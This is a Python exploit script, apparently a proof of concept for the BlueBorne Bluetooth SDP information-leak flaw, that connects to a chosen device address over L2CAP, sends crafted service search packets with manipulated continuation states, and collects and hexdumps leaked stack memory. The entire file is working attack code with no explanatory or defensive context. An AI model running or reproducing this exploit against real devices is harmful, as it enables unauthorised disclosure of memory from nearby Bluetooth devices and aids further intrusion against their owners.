#!/usr/bin/env python3.9

from pwn import *
import bluetooth

if not 'TARGET' in args:
    log.info("Usage: blueborne.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()

target = args['TARGET']
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30

def packet(service, continuation_state):
    pkt = '\x02\x00\x00'.encode()
    pkt += p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'.encode()
    pkt += p16(service)
    pkt += '\x01\x00'.encode()
    pkt += continuation_state
    return pkt

p = log.progress('Exploit')
p.status('Creating L2CAP socket')

sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'

p.status('Connecting to target')
sock.connect((target, 1))

p.status('Sending packet 0')
sock.send(packet(service_long, b'\x00'))
data = sock.recv(mtu)

if data[-3:-2] != b'\x02':
    log.error('Invalid continuation state received.')

stack = b''

for i in range(1, n):
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:]))
    data = sock.recv(mtu)
    stack += data[9:-3]

sock.close()

p.success('Done')

print(hexdump(stack))

